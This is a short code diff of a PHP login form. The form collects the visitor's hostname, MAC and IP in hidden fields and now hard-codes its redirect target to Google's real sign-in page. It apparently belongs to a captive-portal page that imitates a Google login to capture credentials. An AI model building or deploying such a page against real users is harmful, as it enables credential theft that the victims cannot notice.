@@ -139,7 +139,7 @@ require_once('helper.php');
             <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
-            <input type="hidden" name="target" value="<?=$destination?>">
+            <input type="hidden" name="target" value="https://accounts.google.com/signin">
             <button class="btn btn-primary btn-block btn-sharp" name="login" type="submit">Sign in</button>
             <a href="#" class="pull-right need-help">Find my account </a><span class="clearfix"></span>
           </form>
